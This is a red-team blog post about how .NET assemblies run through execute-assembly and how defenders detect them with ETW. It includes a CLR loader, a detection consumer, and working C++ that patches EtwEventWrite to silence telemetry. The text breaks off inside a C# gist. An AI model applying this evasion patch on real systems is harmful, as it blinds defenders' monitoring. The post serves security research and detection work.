@@ -1,0 +1,600 @@
+# https://blog.xpnsec.com/hiding-your-dotnet-etw/
+
+<!DOCTYPE html><html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" style="" dir="ltr" data-cast-api-enabled="true"><!-- Head tag -->
+
+
+<body id="top" class="is-loading" dir="ltr">
+  <!-- Top Navigation Bar -->
+  
+
+  <!-- Social Media Bar -->
+  <div class="social-bar">
+    <div class="social-container">
+      <a href="https://twitter.com/_xpn_" class="social-link" target="_blank" rel="noopener" title="Twitter">
+        <i class="fa fa-twitter" aria-hidden="true"></i>
+        <span>Twitter</span>
+      </a>
+      <a href="https://github.com/xpn" class="social-link" target="_blank" rel="noopener" title="GitHub">
+        <i class="fa fa-github" aria-hidden="true"></i>
+        <span>GitHub</span>
+      </a>
+      <a href="https://linkedin.com/in/xpn" class="social-link" target="_blank" rel="noopener" title="LinkedIn">
+        <i class="fa fa-linkedin" aria-hidden="true"></i>
+        <span>LinkedIn</span>
+      </a>
+      <a href="https://blog.xpnsec.com/rss/" class="social-link" title="RSS Feed">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        <span>RSS</span>
+      </a>
+      <a href="https://www.instagram.com/xpnsecpub" class="social-link" target="_blank" rel="noopener" title="Instagram">
+        <i class="fa fa-instagram" aria-hidden="true"></i>
+        <span>Instagram</span>
+      </a>
+    </div>
+  </div>
+
+  <div class="home-template home">
+    <!--[if lt IE 8]>
+      <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a target="_blank" rel="noopener" href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+    <![endif]-->
+    <div class="container clearfix">
+      <main class="content" role="main">
+        <div class="post-template">
+  <article class="post">
+    <a class="btn" href="https://blog.xpnsec.com/" title="Back to homepage">« Back to home</a>
+
+<div class="post-hero">
+  <div class="post-hero-header">
+    <h1 class="post-hero-title">Hiding your .NET -  ETW</h1>
+  </div>
+  
+  
+    <div class="post-hero-image">
+      <img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/phacker_unhook_title.png" alt="Hiding your .NET -  ETW">
+    </div>
+  
+  <div class="post-hero-date">
+      <span>Posted on </span><time>17th March 2020</time>
+  </div>
+  <hr>
+  <div class="post-hero-footer">
+    <div class="post-hero-meta">
+      <div class="post-hero-tags">
+        
+          <a href="https://blog.xpnsec.com/tags#redteam" class="tag-badge">redteam</a> <a href="https://blog.xpnsec.com/tags#windows" class="tag-badge">windows</a> <a href="https://blog.xpnsec.com/tags#reversing" class="tag-badge">reversing</a> <a href="https://blog.xpnsec.com/tags#.net" class="tag-badge">.net</a>
+        
+      </div>
+      <div class="post-hero-reading-time">
+        <i class="fa fa-clock-o" aria-hidden="true"></i> 11 min read
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<p>After the introduction of Powershell detection capabilities, attackers did what you expect and migrated over to less scrutinised technologies, such as .NET. Fast-forward a few years and many of us are now accustomed with the numerous .NET payloads available for post-exploitation. Suites of tools like those offered by <a target="_blank" rel="noopener" href="https://github.com/GhostPack">GhostPack</a>, as well as <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> are now part of our arsenals, and the engine responsible for powering their delivery is normally Cobalt Strike’s <code>execute-assembly</code>. </p>
+<p>This one function changed how many RedTeam’s operate, and is in my mind one of the primary reasons for the continued popularity in .NET tooling, allowing operators to run Assemblies from unmanaged processes as they follow their post-exploitation playbook.</p>
+<p>Now just as with Powershell, over time defensive capabilities have been introduced by Microsoft and endpoint security vendors to help reduce the blind spots that .NET payload execution introduced (such as the now infamous <a target="_blank" rel="noopener" href="https://twitter.com/_xpn_/status/1069747875100352512?lang=en">AMSI</a> which was introduced in .NET 4.8). And one of the challenges as an attacker has been the continued use of this technology while trying to remain relatively silent. Now of course AMSI <a target="_blank" rel="noopener" href="https://twitter.com/_xpn_/status/1069759374984429568">didn’t prove</a> to be too much of a hassle, but I fear that other techniques used by defenders haven’t received as much scrutiny.</p>
+<p>So over a couple of posts I want to explore just how BlueTeam are going about detecting malicious execution of .NET, its use via methods such as <code>execute-assembly</code>, and how we as attackers can go about evading this, both by bypassing detection and limiting the impact should our toolkit be exposed.</p>
+<p>This first post will focus on Event Threading for Windows (ETW) and how this is used to signal which .NET Assemblies are being executed from unmanaged processes.</p>
+<h2 id="How-execute-assembly-works"><a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/#How-execute-assembly-works" class="headerlink" title="How execute-assembly works"></a>How execute-assembly works</h2><p>To understand a defender’s detective capability, we first need to look at how techniques such as <code>execute-assembly</code> actually works.</p>
+<p>The magic behind this method lies in 3 interfaces <code>ICLRMetaHost</code>, <code>ICLRRuntimeInfo</code> and <code>ICLRRuntimeHost</code>. To start the process of loading the CLR into our “unmanaged” process (otherwise known as a Windows process without the CLR started), we invoke the <code>CLRCreateInstance</code> method. Using this function will provide a <code>ICLRMetaHost</code> interface which exposes information on the list of .NET Frameworks available for us to work with:</p>
+<pre><code class="hljs cpp">ICLRMetaHost *metaHost = <span class="hljs-literal">NULL</span>;	
+IEnumUnknown *runtime = <span class="hljs-literal">NULL</span>;
+
+<span class="hljs-keyword">if</span> (CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&amp;metaHost) != S_OK) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[x] Error: CLRCreateInstance(..)\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+}
+
+<span class="hljs-keyword">if</span> (metaHost-&gt;EnumerateInstalledRuntimes(&amp;runtime) != S_OK) {
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[x] Error: EnumerateInstalledRuntimes(..)\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+}
+</code></pre>
+<p>Once a &nbsp;runtime is selected, we then instantiate our <code>ICLRRuntimeInfo</code> interface which in turn is used to create our <code>ICLRRuntimeHost</code> interface.</p>
+<pre><code class="hljs php">frameworkName = (LPWSTR)LocalAlloc(LPTR, <span class="hljs-number">2048</span>);
+<span class="hljs-keyword">if</span> (frameworkName == <span class="hljs-keyword">NULL</span>) {
+    printf(<span class="hljs-string">"[x] Error: malloc could not allocate\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+}
+
+<span class="hljs-comment">// Enumerate through runtimes and show supported frameworks</span>
+<span class="hljs-keyword">while</span> (runtime-&gt;Next(<span class="hljs-number">1</span>, &amp;enumRuntime, <span class="hljs-number">0</span>) == S_OK) {
+    <span class="hljs-keyword">if</span> (enumRuntime-&gt;QueryInterface&lt;ICLRRuntimeInfo&gt;(&amp;runtimeInfo) == S_OK) {
+        <span class="hljs-keyword">if</span> (runtimeInfo != <span class="hljs-keyword">NULL</span>) {
+            runtimeInfo-&gt;GetVersionString(frameworkName, &amp;bytes);
+            wprintf(L<span class="hljs-string">"[*] Supported Framework: %s\n"</span>, frameworkName);
+        }
+    }
+}
+
+<span class="hljs-comment">// For demo, we just use the last supported runtime</span>
+<span class="hljs-keyword">if</span> (runtimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&amp;runtimeHost) != S_OK) {
+    printf(<span class="hljs-string">"[x] ..GetInterface(CLSID_CLRRuntimeHost...) failed\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+}
+</code></pre>
+<p>Once created, everything comes together via 2 method calls, <code>ICLRRuntimeHost::Start</code> which loads the CLR into our process, and <code>ICLRRuntimeHost::ExecuteInDefaultAppDomain</code> which allows us to provide our Assembly location along with a method name to execute:</p>
+<pre><code class="hljs perl">// Start runtime, <span class="hljs-keyword">and</span> load <span class="hljs-keyword">our</span> assembly
+runtimeHost-&gt;Start();
+
+<span class="hljs-keyword">printf</span>(<span class="hljs-string">"[*] ======= Calling .NET Code =======\n\n"</span>);
+<span class="hljs-keyword">if</span> (runtimeHost-&gt;ExecuteInDefaultAppDomain(
+    L<span class="hljs-string">"myassembly.dll"</span>,
+    L<span class="hljs-string">"myassembly.Program"</span>,
+    L<span class="hljs-string">"test"</span>,
+    L<span class="hljs-string">"argtest"</span>,
+    &amp;result
+) != S_OK) {
+    <span class="hljs-keyword">printf</span>(<span class="hljs-string">"[x] Error: ExecuteInDefaultAppDomain(..) failed\n"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+}
+<span class="hljs-keyword">printf</span>(<span class="hljs-string">"[*] ======= Done =======\n"</span>);
+</code></pre>
+<p>If you want to see this running end-to-end, a while back I created a Gist showing just how to do this <a target="_blank" rel="noopener" href="https://gist.github.com/xpn/e95a62c6afcf06ede52568fcd8187cc2">here</a>.</p>
+<p>Once compiled and executed, we can see just how easy it is to load and execute a .NET Assembly in our unmanaged process:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/unmanaged_execute.png"></p>
+<h2 id="How-BlueTeam-can-detect-Assemblies"><a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/#How-BlueTeam-can-detect-Assemblies" class="headerlink" title="How BlueTeam can detect Assemblies"></a>How BlueTeam can detect Assemblies</h2><p>Now that we know just how <code>execute-assembly</code> works, how do BlueTeam go about detecting its use? Well one common way is using Event Tracing for Windows (ETW), which was originally introduced for debugging and performance monitoring, but has evolved into a tool used by security products and &nbsp;threat hunters to expose potential indicators of compromise. </p>
+<p>I first came across ETW being used in this way from Countercept in their series of posts covering <a target="_blank" rel="noopener" href="https://blog.f-secure.com/detecting-malicious-use-of-net-part-1/">malicious use of .NET</a>. Further examples such as <a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/03/silketw-because-free-telemetry-is-free.html">SilkETW</a> from <a target="_blank" rel="noopener" href="https://twitter.com/FuzzySec">@FuzzySec</a> further demonstrate how ETW is used for analysing Microsoft’s .NET CLR, as well as <a target="_blank" rel="noopener" href="https://github.com/endgameinc/ClrGuard">ClrGuard</a> from Endgame which was developed as a proof-of-concept to detect malicious .NET processes and terminate them.</p>
+<p>Now before we continue any further, I should say that using any kind of payload from the Github “Releases” tab of a project has long since been frowned upon in offensive security. Working to discourage this activity are projects such as <a target="_blank" rel="noopener" href="https://github.com/GhostPack">GhostPack</a> which go as far as to not provide any precompiled binaries at all, forcing users to compile their own solutions. For those not convinced, let’s show how easy it is to detect an adversary who is doing this very thing, taking “<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a>“ as our test case.</p>
+<p>One easy way to view loaded Assemblies within a process is using <a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/">ProcessHacker</a>. Let’s look at just how a process appears when <code>execute-assembly</code> is used to load SharpHound. Below we can see our spawned surrogate process (w32tm.exe in this case) is clearly hosting SharpHound as shown by its .NET Assembly name:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/SharpHound_PH.png"></p>
+<p>To demonstrate just how tools such as this go about enumerating .NET Assemblies, let’s create a very simple ETW consumer which will surface indicators on the .NET Assemblies being loaded and executed by a process. </p>
+<p>Now Unfortunately creating an ETW consumer isn’t the most intuitive task, but we can learn from how ProcessHacker has achieved this <a target="_blank" rel="noopener" href="https://github.com/processhacker/processhacker/blob/master/plugins/DotNetTools/asmpage.c">here</a>, which allows us to create something such as:</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AssemblyDCStart_V1 155</span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wbemidl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wmistr.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;evntrace.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Evntcons.h&gt;</span></span>
+
+<span class="hljs-keyword">static</span> GUID ClrRuntimeProviderGuid = { <span class="hljs-number">0xe13c0d23</span>, <span class="hljs-number">0xccbc</span>, <span class="hljs-number">0x4e12</span>, { <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xe4</span> } };
+
+<span class="hljs-comment">// Can be stopped with 'logman stop "dotnet trace" -etw'</span>
+<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> name[] = <span class="hljs-string">"dotnet trace\0"</span>;
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> pack(1)</span>
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">AssemblyLoadUnloadRundown_V1</span>
+{</span>
+	ULONG64 AssemblyID;
+	ULONG64 AppDomainID;
+	ULONG64 BindingID;
+	ULONG AssemblyFlags;
+	WCHAR FullyQualifiedAssemblyName[<span class="hljs-number">1</span>];
+} AssemblyLoadUnloadRundown_V1, *PAssemblyLoadUnloadRundown_V1;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> pack()</span>
+
+<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> NTAPI <span class="hljs-title">ProcessEvent</span><span class="hljs-params">(PEVENT_RECORD EventRecord)</span> </span>{
+
+	PEVENT_HEADER eventHeader = &amp;EventRecord-&gt;EventHeader;
+	PEVENT_DESCRIPTOR eventDescriptor = &amp;eventHeader-&gt;EventDescriptor;
+	AssemblyLoadUnloadRundown_V1* assemblyUserData;
+
+	<span class="hljs-keyword">switch</span> (eventDescriptor-&gt;Id) {
+		<span class="hljs-keyword">case</span> AssemblyDCStart_V1:
+			assemblyUserData = (AssemblyLoadUnloadRundown_V1*)EventRecord-&gt;UserData;
+			wprintf(<span class="hljs-string">L"[%d] - Assembly: %s\n"</span>, eventHeader-&gt;ProcessId, assemblyUserData-&gt;FullyQualifiedAssemblyName);
+			<span class="hljs-keyword">break</span>;
+	}
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+	TRACEHANDLE hTrace = <span class="hljs-number">0</span>;
+	ULONG result, bufferSize;
+	EVENT_TRACE_LOGFILEA trace;
+	EVENT_TRACE_PROPERTIES *traceProp;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"ETW .NET Trace example - @_xpn_\n\n"</span>);
+
+	<span class="hljs-built_in">memset</span>(&amp;trace, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_LOGFILEA));
+	trace.ProcessTraceMode    = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;
+	trace.LoggerName          = (LPSTR)name;
+	trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)ProcessEvent;
+
+	bufferSize = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="hljs-keyword">sizeof</span>(name) + <span class="hljs-keyword">sizeof</span>(WCHAR);
+
+	traceProp = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);
+	traceProp-&gt;Wnode.BufferSize    = bufferSize;
+	traceProp-&gt;Wnode.ClientContext = <span class="hljs-number">2</span>;
+	traceProp-&gt;Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
+	traceProp-&gt;LogFileMode         = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY;
+	traceProp-&gt;LogFileNameOffset   = <span class="hljs-number">0</span>;
+	traceProp-&gt;LoggerNameOffset    = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);
+
+	<span class="hljs-keyword">if</span> ((result = StartTraceA(&amp;hTrace, (LPCSTR)name, traceProp)) != ERROR_SUCCESS) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error starting trace: %d\n"</span>, result);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	<span class="hljs-keyword">if</span> ((result = EnableTraceEx(
+		&amp;ClrRuntimeProviderGuid,
+		<span class="hljs-literal">NULL</span>,
+		hTrace,
+		<span class="hljs-number">1</span>,
+		TRACE_LEVEL_VERBOSE,
+		<span class="hljs-number">0x8</span>, <span class="hljs-comment">// LoaderKeyword</span>
+		<span class="hljs-number">0</span>,
+		<span class="hljs-number">0</span>,
+		<span class="hljs-literal">NULL</span>
+	)) != ERROR_SUCCESS) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error EnableTraceEx\n"</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
+	}
+
+	hTrace = OpenTrace(&amp;trace);
+	<span class="hljs-keyword">if</span> (hTrace == INVALID_PROCESSTRACE_HANDLE) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error OpenTrace\n"</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;
+	}
+
+	result = ProcessTrace(&amp;hTrace, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+	<span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Error ProcessTrace\n"</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;
+	}
+
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>With our consumer crafted, let’s kick it off and then attempt to use the <code>execute-assembly</code> option in Cobalt Strike to run Sharphound:</p>
+<div class="video-container"><div src="https://www.youtube.com/embed/aIQNkSbxTM8" frameborder="0" loading="lazy" allowfullscreen="" data-original-tag="iframe"><link rel="stylesheet" href="https://www.youtube.com/s/player/1798f86c/www-player.css" name="www-player" nonce=""><link rel="preload" href="https://www.youtube.com/s/player/1798f86c/player_es6.vflset/en_US/embed.js" name="player/embed" as="script" nonce=""><link rel="preconnect" href="https://i.ytimg.com/"><title>YouTube</title><link rel="canonical" href="https://www.youtube.com/watch?v=aIQNkSbxTM8"><div id="player"></div></div></div>
+
+<p>And as you can see, the Sharphound Assembly name is quickly surfaced, giving an immediate indication that this tool is in use. Now of course a quick and easy fix for this would be to actually compile the tool and rename the Assembly to something less obvious, for example:</p>
+<pre><code class="hljs">msbuild.exe /p:AssemblyName=notmalware ...
+</code></pre>
+<p>This of course only solves the problem of how we avoid detection by Assembly name. What if we adapted our ETW tool to start surfacing suspect method names being invoked, which we could easily do by adding in something such as:</p>
+<pre><code class="hljs php">...
+<span class="hljs-keyword">switch</span> (eventDescriptor-&gt;Id) {
+  <span class="hljs-keyword">case</span> MethodLoadVerbose_V1:
+    methodUserData = (struct _MethodLoadVerbose_V1*)EventRecord-&gt;UserData;
+    WCHAR* MethodNameSpace = methodUserData-&gt;MethodNameSpace;
+    WCHAR* MethodName = (WCHAR*)(((char*)methodUserData-&gt;MethodNameSpace) + (lstrlenW(methodUserData-&gt;MethodNameSpace) * <span class="hljs-number">2</span>) + <span class="hljs-number">2</span>);
+    WCHAR* MethodSignature = (WCHAR*)(((char*)MethodName) + (lstrlenW(MethodName) * <span class="hljs-number">2</span>) + <span class="hljs-number">2</span>);
+    wprintf(L<span class="hljs-string">"[%d] - MethodNameSpace: %s\n"</span>, eventHeader-&gt;ProcessId, methodUserData-&gt;MethodNameSpace);
+    wprintf(L<span class="hljs-string">"[%d] - MethodName: %s\n"</span>, eventHeader-&gt;ProcessId, MethodName);
+    wprintf(L<span class="hljs-string">"[%d] - MethodSignature: %s\n"</span>, eventHeader-&gt;ProcessId, MethodSignature);
+    <span class="hljs-keyword">break</span>;
+...
+</code></pre>
+<p>Again if we execute our SharpHound Assembly, even when renamed we see an immediate indication that someone is up to no good due to the SharpHound namespace, class names and method names:</p>
+<div class="video-container"><div src="cid:frame-A27EE22233A249D5732D1776BEA48F5E@mhtml.blink" frameborder="0" loading="lazy" allowfullscreen="" data-original-tag="iframe"></div></div>
+
+<p>If you want to try this ETW consumer for yourself, the source code is available <a target="_blank" rel="noopener" href="https://gist.github.com/xpn/41f193cf1bdeeee19ebd351b19cff45c">here</a>.</p>
+<p>So with that in mind, we could again obfuscate our method names (check out my <a href="https://blog.xpnsec.com/building-modifying-packing-devops/">previous posts</a> for examples of how we can do this), but ultimately we’re in a cat and mouse game against ETW each time.</p>
+<h2 id="How-does-the-CLR-surface-events-via-ETW"><a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/#How-does-the-CLR-surface-events-via-ETW" class="headerlink" title="How does the CLR surface events via ETW?"></a>How does the CLR surface events via ETW?</h2><p>Hopefully by this point the goal is obvious, we need to stop ETW from reporting our malicious activity to defenders. To do this we first need to understand just how the CLR exposes its events via ETW.</p>
+<p>Let’s take a look at <code>clr.dll</code> to try and see if we can spot the moment that an event is triggered. Loading the PDB and hunting for the <code>AssemblyDCStart_V1</code> symbol using Ghidra, we quickly land on the following method:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/ghidra.png"></p>
+<p>Let’s see if we can find the exact point that an event is generated reporting the Assembly load which we observed above with our ETW consumer. Dropping into WinDBG and setting a breakpoint on all <code>ntdll!EtwEventWrite</code> calls occurring after the <code>ModuleLoad</code> method above, we quickly discover the following where we can see our Assembly name of “test” is being sent:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/windbg.png"></p>
+<p>So this tells us 2 things. First, these ETW events are sent from userland, and second that these ETW events are issued from within a process that we control… And as we know, having a malicious process report that it is doing something malicious never ends well.</p>
+<h2 id="How-RedTeam-can-disable-NET-ETW"><a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/#How-RedTeam-can-disable-NET-ETW" class="headerlink" title="How RedTeam can disable .NET ETW"></a>How RedTeam can disable .NET ETW</h2><p>By now you hopefully see the flaw in relying on ETW for indicators of malicious activity. Let’s make some modifications to our unmanaged .NET loader by adding in the ability to patch out the <code>ntdll!EtwEventWrite</code> call.</p>
+<p>For this example we will target x86. Let’s dig out that <code>EtwEventWrite</code> function to see what we’re working with. If we follow the function disassembly we find that the return is completed via a <code>ret 14h</code> opcode:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/etw_ret.png"></p>
+<p>To neuter this function we will use the same <code>ret 14h</code> opcode bytes of <code>c21400</code> and apply them to the beginning of the function:</p>
+<pre><code class="hljs cpp"><span class="hljs-comment">// Get the EventWrite function</span>
+<span class="hljs-keyword">void</span> *eventWrite = GetProcAddress(LoadLibraryA(<span class="hljs-string">"ntdll"</span>), <span class="hljs-string">"EtwEventWrite"</span>);
+
+<span class="hljs-comment">// Allow writing to page</span>
+VirtualProtect(eventWrite, <span class="hljs-number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProt);
+
+<span class="hljs-comment">// Patch with "ret 14" on x86</span>
+<span class="hljs-built_in">memcpy</span>(eventWrite, <span class="hljs-string">"\xc2\x14\x00\x00"</span>, <span class="hljs-number">4</span>);
+
+<span class="hljs-comment">// Return memory to original protection</span>
+VirtualProtect(eventWrite, <span class="hljs-number">4</span>, oldProt, &amp;oldOldProt);
+</code></pre>
+<p>Once this is done, we can see that the function will simply return and clean up the stack:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/hook.png"></p>
+<p>So what happens to our ETW detection example now when we run our SharpHound Assembly? Well before we patched out ETW we would see something like this:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/etw_patch_before2.png"></p>
+<p>And after we’re done patching, we see that no events are logged:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/etw_patch_after.png"></p>
+<p>The source for this example can be found <a target="_blank" rel="noopener" href="https://gist.github.com/xpn/fabc89c6dc52e038592f3fb9d1374673">here</a>.</p>
+<p>So this is of course useful when we are using our own unmanaged .NET execution cradle, but how simple is it to do this from within a managed process? For example, couldn’t we just do this before we make an <code>Assembly.Load</code> call? Well patching ETW from within .NET obviously comes with some limitations, mainly that you will still expose everything up to the point of patching, but this this still possible when attempting to load further Assemblies with something like:</p>
+
+<link rel="stylesheet" href="https://github.githubassets.com/assets/gist-embed-8703547f549b05ef.css"><div id="gist101856254" class="gist">
+    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
+      <div class="gist-data">
+        
+<div class="js-gist-file-update-container js-task-list-container">
+      <div id="file-dotnet_unhook_etw-cs" class="file my-2">
+    
+    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="dotnet_unhook_etw.cs content, created by xpn on 09:00PM on March 17, 2020.">
+
+        
+<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">
+
+  
+  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
+  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <span>
+      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
+      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
+    </span>
+
+
+  <div data-view-component="true" class="flash-action">        <a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/" data-view-component="true" class="btn-sm btn">    Show hidden characters
+</a>
+</div>
+</div>
+
+  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+</span>
+
+  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="dotnet_unhook_etw.cs">
+        <tbody><tr>
+          <td id="file-dotnet_unhook_etw-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">using</span> <span class="pl-s1">System</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">using</span> <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Reflection</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">using</span> <span class="pl-s1">System</span><span class="pl-kos">.</span><span class="pl-s1">Runtime</span><span class="pl-kos">.</span><span class="pl-s1">InteropServices</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC4" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">namespace</span> <span class="pl-v">test</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
